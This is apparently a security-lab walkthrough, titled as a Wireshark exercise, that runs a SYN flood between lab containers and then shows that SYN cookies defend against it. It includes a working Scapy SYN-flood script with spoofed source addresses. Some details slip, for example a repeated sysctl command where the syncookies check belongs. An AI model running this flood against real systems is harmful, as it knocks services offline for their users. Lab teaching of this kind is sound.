# Getting Started with Wireshark

The objective of this exercise is to gain a foundational understanding of the Wireshark packet sniffer, packet capture, and protocol analysis. 

## Assumptions
- In this lab, we have three machines
      - 1 attacker machine: seed-attacker
      - 1 victim machine: IP Address - 10.9.0.5
      - 1 user machine: IP address - 10.9.0.6
- We use containers to set up the lab environment
- All these machines are on the same LAN

## Task 1: SYNFlooding Attack with SYN cookies off (0)

<details>
  <summary> What is a SYN Flooding Attack? </summary>
              A **SYN flood is a type of DoS (Denial-of-Service) attack** where an attacker sends a large number of SYN requests to a victim’s server but does not complete the TCP three-way handshake. The attacker may use fake (spoofed) IP addresses or simply never send the final ACK. As a result, the server keeps waiting for these incomplete connections and stores them in a **queue for half-open connections**. If the attacker sends enough SYN requests, this queue becomes full. Once the queue is full, the server may not be able to accept new connections from legitimate users, making the service unavailable.

</details>

### Open the Victim container.
1) Open a new terminal and execute the following command. You are now inside the victim machine, 10.9.0.5.

  ```javascript
  docksh 427
  ```

<img width="839" height="131" alt="image" src="https://github.com/user-attachments/assets/495e4ec7-21a4-4855-b2d2-4ef8498af3fa" />

### Check the SYN queue
2) Insider the victim container, execute the following command. This is the maximum backlog setting (128) relevant to the half-open TCP connections.

  ```javascript
  sysctl net.ipv4.tcp_max_syn_backlog
  ```

3) Now check SYN cookies. The SEED environment intentionally has SYN cookies disabled on the victim so that you can observe the SYN-flood behavior.

  ```javascript
  sysctl net.ipv4.tcp_max_syn_backlog
  ```

  <img width="841" height="183" alt="image" src="https://github.com/user-attachments/assets/5635a2df-9869-4382-98d4-ff177fe44d96" />

### Watch the half-open connections

4) Still inside the victim, execute the following command. This counts the connections currently in the SYN-RECV state.

  ```javascript
  netstat -tna | grep SYN_RECV | wc -l
  ```

5) You can repeatedly run the command while the attack is happening by executing:
   
  ```javascript
  watch -n 1 "netstat -tna | grep SYN_RECV | wc -l"
  ```

### Open the Attacker container.
6) Open a new terminal and execute the following command. You are now inside the attacker machine, seed-attacker.

  ```javascript
 docksh a9d
  ```

###  Launching the Attack Using Python (synflood.py)

7) Within the attacker container, run the following commands

  ```javascript
cd /volumes
  ```

  ```javascript
ls
  ```

  ```javascript
nano synflood.py
  ```

  ```javascript
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5") # send the packet to the victim
tcp = TCP(dport=23, flags='S') # Send a TCP packet to port 23, with the SYN flag set.
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32))) # Pretend the packet came from a randomly generated IP address.
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
  ```

### Start the SYN flood attack

<img width="963" height="387" alt="image" src="https://github.com/user-attachments/assets/84660333-e7cc-4706-8e12-da9392c29368" />

### Return to the Victim terminal

<img width="1603" height="391" alt="image" src="https://github.com/user-attachments/assets/dd70b645-ab14-4892-8a20-c11938b6885e" />

### Try to connect as User1

8) Open a new terminal and execute the following command. You are now inside the Normal User 1 machine, 10.9.0.6.

  ```javascript
  docksh db8
  ```

9) Insider the User 1 container, attempt to connect to the Victim Machine (10.9.0.5).

  ```javascript
  telnet 10.9.0.5
  ```

<img width="745" height="316" alt="image" src="https://github.com/user-attachments/assets/d880f5cb-9042-40ec-8989-88f1a54e6fd2" />


Conclusion: Under a successful SYN-flood demonstration, the legitimate connection may fail to establish or may take a long time because the victim's resources for half-open connections are being consumed.

## Task 1: SYNFlooding Attack with SYN cookies on (1)

### Turn SYN cookies ON
1) Inside the Victim machine, run the following command to turn SYN cookies on:

  ```javascript
  sysctl -w net.ipv4.tcp_syncookies=1
  ```

2) Verify that SYN-cookie is on by running:

  ```javascript
  sysctl net.ipv4.tcp_syncookies
  ```
<img width="822" height="413" alt="image" src="https://github.com/user-attachments/assets/e8b616bc-03c3-4656-8bcd-7e23fc86c711" />

SYN cookies:       1  ✅

<details>
  <summary> Why are we doing this? </summary>
              The purpose is to give the server protection when it detects a SYN flood, rather than simply relying on the half-open connection queue. SYN cookies protect against SYN floods by allowing the server to handle SYN requests without filling up its half-open connection queue, so fake SYN packets have much less ability to block legitimate connections.

</details>

### Start the C attack again
3) Go back to the Attacker terminal and run:

  ```javascript
  cd /volumes
  ```
followed by:

  ```javascript
  ./synflood 10.9.0.5 23
  ```
<img width="777" height="251" alt="image" src="https://github.com/user-attachments/assets/3863317c-62bb-4c9c-b566-5b879146b325" />

Test a legitimate connection

4) Return to User 2 terminal, and try to connect to the Victim Machine (10.9.0.5)

<img width="822" height="240" alt="image" src="https://github.com/user-attachments/assets/ee2d70a0-5417-4d44-b22e-9d6fb5b448be" />

Conclusion: After enabling SYN cookies, the legitimate User 2 connection to 10.9.0.5 continued to succeed, demonstrating that the SYN-cookie mechanism helps the server handle SYN-flood traffic without relying solely on the normal half-open connection queue.
